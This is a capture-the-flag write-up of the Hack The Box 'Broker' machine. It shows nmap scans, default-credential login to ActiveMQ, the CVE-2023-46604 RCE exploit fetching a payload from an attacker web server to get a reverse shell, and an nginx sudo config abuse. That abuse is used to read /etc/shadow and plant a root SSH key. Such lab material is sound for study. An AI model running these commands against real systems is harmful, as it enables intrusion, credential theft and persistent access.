## Intro

tags: #linux #OSCPpath #WebApp #known-binary #easy

---
## Logging

- logs only current terminal
- type `exit` or press `Ctrl+D` to stop and save the file
- - to stop and save the file. You can replay it later using [scriptreplay](https://www.keuperict.nl/posts/security/2019/11/20/logging-terminal-session/)
```
script -t=timing.log broker.log
```
ctrl+d should show this output:
```shell
exit
Script done.
```
now replay it as video on your terminal
```shell
scriptreplay -t timing.log broker.log
```
if sth strange happens and did not happen to execute ctrl+d then
```shell
echo $SCRIPT
```
- If it outputs a path to a file (like `/home/kali/typescript`), **you are still recording**.
- If it returns a blank line, **you are not recording**.
- even if i close terminal the output will be saved

-> clean log for reporting, its now plaintext as shown on terminal
```shell
sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" bashed.log > bashed_report.txt
```

-----
# Reconnaissance

```shell
source basher target1 10.129.230.87 [IP]
source basher host1 broker.htb [host]

echo "$target1 $host1" | sudo tee -a /etc/hosts
```

## Port scan
### Identify open  TCP ports fast
```shell
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n $target1
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-06 06:59 -0400
Nmap scan report for 10.129.230.87
Host is up (0.057s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
1883/tcp  open  mqtt
5672/tcp  open  amqp
8161/tcp  open  patrol-snmp
46815/tcp open  unknown
61613/tcp open  unknown
61614/tcp open  unknown
61616/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 12.94 seconds
```

### Scan specific open TCP ports
```shell
sudo nmap -p22,80,1823,5672,8161 -A $target1
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-06 07:01 -0400
Nmap scan report for broker.htb (10.129.230.87)
Host is up (0.047s latency).

PORT     STATE  SERVICE   VERSION
22/tcp   open   ssh       OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open   http      nginx 1.18.0 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Error 401 Unauthorized
1823/tcp closed unisys-lm
5672/tcp open   amqp?
|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     AMQP
|     AMQP
|     amqp:decode-error
|_    7Connection from client using unsupported AMQP attempted
8161/tcp open   http      Jetty 9.4.39.v20210325
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-title: Error 401 Unauthorized
|_http-server-header: Jetty(9.4.39.v20210325)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5672-TCP:V=7.98%I=7%D=9/6%Time=6A9D4800%P=x86_64-pc-linux-gnu%r(Get
SF:Request,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\x
SF:c0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\
SF:0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20clie
SF:nt\x20using\x20unsupported\x20AMQP\x20attempted")%r(HTTPOptions,89,"AMQ
SF:P\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\
SF:0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02
SF:\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client\x20using\x20
SF:unsupported\x20AMQP\x20attempted")%r(RTSPRequest,89,"AMQP\x03\x01\0\0AM
SF:QP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\
SF:x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:de
SF:code-error\xa17Connection\x20from\x20client\x20using\x20unsupported\x20
SF:AMQP\x20attempted")%r(RPCCheck,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0
SF:\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02
SF:\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Con
SF:nection\x20from\x20client\x20using\x20unsupported\x20AMQP\x20attempted"
SF:)%r(DNSVersionBindReqTCP,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x
SF:02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0
SF:\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connectio
SF:n\x20from\x20client\x20using\x20unsupported\x20AMQP\x20attempted")%r(DN
SF:SStatusRequestTCP,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\
SF:0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18
SF:\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20fr
SF:om\x20client\x20using\x20unsupported\x20AMQP\x20attempted")%r(SSLSessio
SF:nReq,89,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\
SF:x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\
SF:x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client\
SF:x20using\x20unsupported\x20AMQP\x20attempted")%r(TerminalServerCookie,8
SF:9,"AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x0
SF:4\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc
SF:0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client\x20usi
SF:ng\x20unsupported\x20AMQP\x20attempted");
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1823/tcp)
HOP RTT      ADDRESS
1   46.01 ms 10.10.14.1
2   46.09 ms broker.htb (10.129.230.87)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.07 seconds

```
found version `Jetty 9.4.39.v20210325`

### Identify open UDP ports

```shell
sudo nmap -p- --open -sU --min-rate 5000 -Pn -n $target1
```
no ports found

## Webapp

### Browsing
`http://broker.htb:8161`
![](MediaFiles/Pasted%20image%2020260906140224.png)
admin:admin works!
![](MediaFiles/Pasted%20image%2020260906140246.png)
found version
![](MediaFiles/Pasted%20image%2020260906140318.png)
![](MediaFiles/Pasted%20image%2020260906140814.png)

### Vulnerable version

```shell
─$ searchsploit Jetty
------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                    |  Path
------------------------------------------------------------------ ---------------------------------
Eclipse Jetty 11.0.5 - Sensitive File Disclosure                  | java/webapps/50478.txt
Jetty 3.1.6/3.1.7/4.1 Servlet Engine - Arbitrary Command Executio | cgi/webapps/21895.txt
Jetty 4.1 Servlet Engine - Cross-Site Scripting                   | jsp/webapps/21875.txt
Jetty 6.1.x - JSP Snoop Page Multiple Cross-Site Scripting Vulner | jsp/webapps/33564.txt
jetty 6.x < 7.x - Cross-Site Scripting / Information Disclosure / | jsp/webapps/9887.txt
Jetty 9.4.37.v20210219 - Information Disclosure                   | java/webapps/50438.txt
Jetty Web Server - Directory Traversal                            | windows/remote/36318.txt
Mortbay Jetty 7.0.0-pre5 Dispatcher Servlet - Denial of Service   | multiple/dos/8646.php
------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

┌──(ch3ckm8㉿kali)-[~/HTB/broker]
└─$ searchsploit -m 50438                                                                           
  Exploit: Jetty 9.4.37.v20210219 - Information Disclosure
      URL: https://www.exploit-db.com/exploits/50438
     Path: /usr/share/exploitdb/exploits/java/webapps/50438.txt
    Codes: CVE-2021-28164
 Verified: False
File Type: ASCII text
Copied to: /home/ch3ckm8/HTB/broker/50438.txt



┌──(ch3ckm8㉿kali)-[~/HTB/broker]
└─$ cat 50438.txt                                                                                   
# Exploit Title: Jetty 9.4.37.v20210219 - Information Disclosure
# Date: 2021-10-21
# Exploit Author: Mayank Deshmukh
# Vendor Homepage: https://www.eclipse.org/jetty/
# Software Link: https://repo1.maven.org/maven2/org/eclipse/jetty/jetty-distribution/9.4.37.v20210219/
# Version: 9.4.37.v20210219 and 9.4.38.v20210224
# Tested on: Kali Linux
# CVE : CVE-2021-28164

POC #1 - web.xml

GET /%2e/WEB-INF/web.xml HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```
tried but did not work, found also another version
![](MediaFiles/Pasted%20image%2020260906141014.png)

------
# Foothold

## Exploiting vulnerable webapp version

for this `activemq` version i found this :
https://github.com/strikoder/CVE-2023-46604-ActiveMQ-RCE-Python.git
```shell
─$ git clone https://github.com/strikoder/CVE-2023-46604-ActiveMQ-RCE-Python.git                   
Cloning into 'CVE-2023-46604-ActiveMQ-RCE-Python'...
remote: Enumerating objects: 31, done.
remote: Counting objects: 100% (31/31), done.
remote: Compressing objects: 100% (26/26), done.
remote: Total 31 (delta 10), reused 12 (delta 3), pack-reused 0 (from 0)
Receiving objects: 100% (31/31), 1.65 MiB | 5.79 MiB/s, done.
Resolving deltas: 100% (10/10), done.

┌──(ch3ckm8㉿kali)-[~/HTB/broker]
└─$ cd CVE-2023-46604-ActiveMQ-RCE-Python                                                           

┌──(ch3ckm8㉿kali)-[~/HTB/broker/CVE-2023-46604-ActiveMQ-RCE-Python]
└─$ python3 generate_poc.py -i 10.10.14.247 -p 1001                                                 
[*] PoC XML written to poc-linux.xml

┌──(ch3ckm8㉿kali)-[~/HTB/broker/CVE-2023-46604-ActiveMQ-RCE-Python]
└─$ python3 main.py -i $TARGET_IP -u http://10.10.14.247:2002/poc-linux.xml                         
usage: main.py [-h] -i IP [-p PORT] -u URL
main.py: error: argument -i: expected one argument

┌──(ch3ckm8㉿kali)-[~/HTB/broker/CVE-2023-46604-ActiveMQ-RCE-Python]
└─$ python3 main.py -i broker.htb -u http://10.10.14.247:2002/poc-linux.xml

     _        _   _           __  __  ___        ____   ____ _____ 
    / \   ___| |_(_)_   _____|  \/  |/ _ \      |  _ \ / ___| ____|
   / _ \ / __| __| \ \ / / _ \ |\/| | | | |_____| |_) | |   |  _|  
  / ___ \ (__| |_| |\ V /  __/ |  | | |_| |_____|  _ <| |___| |___ 
 /_/   \_\___|\__|_| \_/ \___|_|  |_|\__\_\     |_| \_\\____|_____|

[*] Target: broker.htb:61616
[*] XML URL: http://10.10.14.247:2002/poc-linux.xml

[*] Sending packet: 000000791f000000000000000000010100426f72672e737072696e676672616d65776f726b2e636f6e746578742e737570706f72742e436c61737350617468586d6c4170706c69636174696f6e436f6e74657874010026687474703a2f2f31302e31302e31342e3234373a323030322f706f632d6c696e75782e786d6c

┌──(ch3ckm8㉿kali)-[~/HTB/broker/CVE-2023-46604-ActiveMQ-RCE-Python]
└─$ python3 main.py -i broker.htb -u http://10.10.14.247:2002/poc-linux.xml                         

     _        _   _           __  __  ___        ____   ____ _____ 
    / \   ___| |_(_)_   _____|  \/  |/ _ \      |  _ \ / ___| ____|
   / _ \ / __| __| \ \ / / _ \ |\/| | | | |_____| |_) | |   |  _|  
  / ___ \ (__| |_| |\ V /  __/ |  | | |_| |_____|  _ <| |___| |___ 
 /_/   \_\___|\__|_| \_/ \___|_|  |_|\__\_\     |_| \_\\____|_____|

[*] Target: broker.htb:61616
[*] XML URL: http://10.10.14.247:2002/poc-linux.xml

[*] Sending packet: 000000791f000000000000000000010100426f72672e737072696e676672616d65776f726b2e636f6e746578742e737570706f72742e436c61737350617468586d6c4170706c69636174696f6e436f6e74657874010026687474703a2f2f31302e31302e31342e3234373a323030322f706f632d6c696e75782e786d6c
```
start local server for transfer
```shell
└─$ python3 -m http.server 2002                       
Serving HTTP on 0.0.0.0 port 2002 (http://0.0.0.0:2002/) ...
10.129.230.87 - - [06/Sep/2026 07:23:00] "GET /poc-linux.xml HTTP/1.1" 200 -
10.129.230.87 - - [06/Sep/2026 07:23:00] "GET /poc-linux.xml HTTP/1.1" 200 -
```
got shell back
## Shell as activemq
```shell
└─$ nc -nvlp 1001                                                                                                                           
listening on [any] 1001 ...
connect to [10.10.14.247] from (UNKNOWN) [10.129.230.87] 47644
bash: cannot set terminal process group (878): Inappropriate ioctl for device
bash: no job control in this shell
activemq@broker:/opt/apache-activemq-5.15.15/bin$ 
```

first lets grab user flag
```shell
activemq@broker:/home$ cd activemq
cd activemq
activemq@broker:~$ ls
ls
user.txt
activemq@broker:~$ cat user.txt
cat user.txt
05757cd8465c7350584254e633595091
```

----
# Privesc

## Filesystem enumeration

```shell
activemq@broker:/opt/apache-activemq-5.15.15/conf$ cat credentials.properties
cat credentials.properties
## ---------------------------------------------------------------------------
## Licensed to the Apache Software Foundation (ASF) under one or more
## contributor license agreements.  See the NOTICE file distributed with
## this work for additional information regarding copyright ownership.
## The ASF licenses this file to You under the Apache License, Version 2.0
## (the "License"); you may not use this file except in compliance with
## the License.  You may obtain a copy of the License at
## 
## http://www.apache.org/licenses/LICENSE-2.0
## 
## Unless required by applicable law or agreed to in writing, software
## distributed under the License is distributed on an "AS IS" BASIS,
## WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
## See the License for the specific language governing permissions and
## limitations under the License.
## ---------------------------------------------------------------------------

# Defines credentials that will be used by components (like web console) to access the broker

activemq.username=system
activemq.password=manager
guest.password=password
```
also found
```shell
activemq@broker:/opt/apache-activemq-5.15.15/conf$ cat jmx.password
cat jmx.password
## ---------------------------------------------------------------------------
## Licensed to the Apache Software Foundation (ASF) under one or more
## contributor license agreements.  See the NOTICE file distributed with
## this work for additional information regarding copyright ownership.
## The ASF licenses this file to You under the Apache License, Version 2.0
## (the "License"); you may not use this file except in compliance with
## the License.  You may obtain a copy of the License at
##
## http://www.apache.org/licenses/LICENSE-2.0
##
## Unless required by applicable law or agreed to in writing, software
## distributed under the License is distributed on an "AS IS" BASIS,
## WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
## See the License for the specific language governing permissions and
## limitations under the License.
## ---------------------------------------------------------------------------

admin activemq
```
nothing interesting regarding privesc found here
## sudo -l

```shell
activemq@broker:~$ sudo -l
sudo -l
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```
### Known binary
```shell
activemq@broker:~$ /usr/sbin/nginx
/usr/sbin/nginx
nginx: [alert] could not open error log file: open() "/var/log/nginx/error.log" failed (13: Permission denied)
2026/09/06 11:30:50 [warn] 1433#1433: the "user" directive makes sense only if the master process runs with super-user privileges, ignored in /etc/nginx/nginx.conf:1
2026/09/06 11:30:50 [emerg] 1433#1433: open() "/var/log/nginx/access.log" failed (13: Permission denied)
```
lets see available options
```shell
activemq@broker:/etc/nginx$ /usr/sbin/nginx -h
/usr/sbin/nginx -h
nginx version: nginx/1.18.0 (Ubuntu)
Usage: nginx [-?hvVtTq] [-s signal] [-c filename] [-p prefix] [-g directives]

Options:
  -?,-h         : this help
  -v            : show version and exit
  -V            : show version and configure options then exit
  -t            : test configuration and exit
  -T            : test configuration, dump it and exit
  -q            : suppress non-error messages during configuration testing
  -s signal     : send signal to a master process: stop, quit, reopen, reload
  -p prefix     : set prefix path (default: /usr/share/nginx/)
  -c filename   : set configuration file (default: /etc/nginx/nginx.conf)
  -g directives : set global directives out of configuration file

```
version
```shell
activemq@broker:/etc/nginx$ /usr/sbin/nginx -v
/usr/sbin/nginx -v
nginx version: nginx/1.18.0 (Ubuntu)

```
but the most interesting her eis the `-c filename` which sets configuration file
```shell
  -c filename   : set configuration file (default: /etc/nginx/nginx.conf)
```

```SHELL
sudo nginx -c /tmp/nginx_pwn.conf
```
### Exploiting known binary
https://gtfobins.org/gtfobins/nginx/
https://github.com/DylanGrl/nginx_sudo_privesc/tree/main
```shell
activemq@broker:/tmp$ cat nginx_pwn.conf
cat nginx_pwn.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
        worker_connections 768;
}
http {
        server {
                listen 1339;
                root /;
                autoindex on;
                dav_methods PUT;
        }
}
activemq@broker:/tmp$ ls
ls
nginx_pwn.conf
root
root_key
root_key.pub
script.sh
activemq@broker:/tmp$ cat root
cat root
activemq@broker:/tmp$ ls -la
ls -la
total 36
drwxrwxrwt  2 root     root     4096 Sep  6 11:47 .
drwxr-xr-x 18 root     root     4096 Nov  6  2023 ..
-rw-r--r--  1 activemq activemq 1024 Sep  6 11:42 .exploit.sh.swp
-rw-r--r--  1 activemq activemq  246 Sep  6 11:43 nginx_pwn.conf
-rw-------  1 activemq activemq 2602 Sep  6 11:47 .root
-rw-r--r--  1 activemq activemq    0 Sep  6 11:47 root
-rw-------  1 activemq activemq 2602 Sep  6 11:43 root_key
-rw-r--r--  1 activemq activemq  569 Sep  6 11:43 root_key.pub
-rw-r--r--  1 activemq activemq  569 Sep  6 11:47 .root.pub
-rwxr-xr-x  1 activemq activemq  665 Sep  6 11:42 script.sh
activemq@broker:/tmp$ curl localhost:1339/etc/shadow      
curl localhost:1339/etc/shadow
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1119  100  1119    0     0   801k      0 --:--:-- --:--:-- --:--:-- 1092k
root:$y$j9T$S6NkiGlTDU3IUcdBZEjJe0$sSHRUiGL/v4FZkWjU.HZ6cX2vsMY/rdFBTt25LbGxf1:19666:0:99999:7:::
daemon:*:19405:0:99999:7:::
bin:*:19405:0:99999:7:::
sys:*:19405:0:99999:7:::
sync:*:19405:0:99999:7:::
games:*:19405:0:99999:7:::
man:*:19405:0:99999:7:::
lp:*:19405:0:99999:7:::
mail:*:19405:0:99999:7:::
news:*:19405:0:99999:7:::
uucp:*:19405:0:99999:7:::
proxy:*:19405:0:99999:7:::
www-data:*:19405:0:99999:7:::
backup:*:19405:0:99999:7:::
list:*:19405:0:99999:7:::
irc:*:19405:0:99999:7:::
gnats:*:19405:0:99999:7:::
nobody:*:19405:0:99999:7:::
_apt:*:19405:0:99999:7:::
systemd-network:*:19405:0:99999:7:::
systemd-resolve:*:19405:0:99999:7:::
messagebus:*:19405:0:99999:7:::
systemd-timesync:*:19405:0:99999:7:::
pollinate:*:19405:0:99999:7:::
sshd:*:19405:0:99999:7:::
syslog:*:19405:0:99999:7:::
uuidd:*:19405:0:99999:7:::
tcpdump:*:19405:0:99999:7:::
tss:*:19405:0:99999:7:::
landscape:*:19405:0:99999:7:::
fwupd-refresh:*:19405:0:99999:7:::
usbmux:*:19474:0:99999:7:::
lxd:!:19474::::::
activemq:$y$j9T$5eMce1NhiF0t9/ZVwn39P1$pCfvgXtARGXPYDdn2AVdkCnXDf7YO7He/x666g6qLM5:19666:0:99999:7:::
_laurel:!:19667::::::
```
grabbed root flag
```shell
activemq@broker:/tmp$ curl localhost:1339/root/root.txt
curl localhost:1339/root/root.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    33  100    33    0     0  41457      0 --:--:-- --:--:-- --:--:-- 33000
b950d0fb8ee8e259ad9593bb999d3b16
```
okay we got the flag, but lets get a shell also
## Persistence

Since we've got the ability to upload anything to the server (thats what the conf file earlier did) using the `PUT` command, let's upload our SSH key to the `/root/.ssh` path.
```shell
Eter same passphrase again: 
Your identification has been saved in rr
Your public key has been saved in rr.pub
The key fingerprint is:
SHA256:vG3vhy3B7II10YzVnxKnw0AvyR1G0pTyj8HTecgJytU activemq@broker
The key's randomart image is:
+---[RSA 3072]----+
|          .o+B.  |
|          .oX+E. |
|         . @*==+o|
|       .  = +X++o|
|        S  +  B .|
|         oo +. . |
|        .ooo +   |
|        ....+ o  |
|           ooo   |
+----[SHA256]-----+
[+] Display SSH Private Key for copy...
cat: .ssh/id_rsa: No such file or directory
[+] Add key to root user...
cat: .ssh/id_rsa.pub: No such file or directory
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
[+] Use the SSH key to get access
```
then on attacker, 
```shell
curl -X PUT http://broker.htb:1339/root/.ssh/authorized_keys --upload-file ./authorized_keys
```
## Shell as root
```shell
└─$ ssh root@broker.htb -i ch3ckm8_private_key                                                                
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Sep  6 12:20:01 PM UTC 2026

  System load:           0.0
  Usage of /:            70.8% of 4.63GB
  Memory usage:          14%
  Swap usage:            0%
  Processes:             163
  Users logged in:       0
  IPv4 address for eth0: 10.129.230.87
  IPv6 address for eth0: dead:beef::a0de:adff:fe79:cc83

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

root@broker:~# whoami
root
root@broker:~# cat root.txt 
b950d0fb8ee8e259ad9593bb999d3b16
root@broker:~# 
```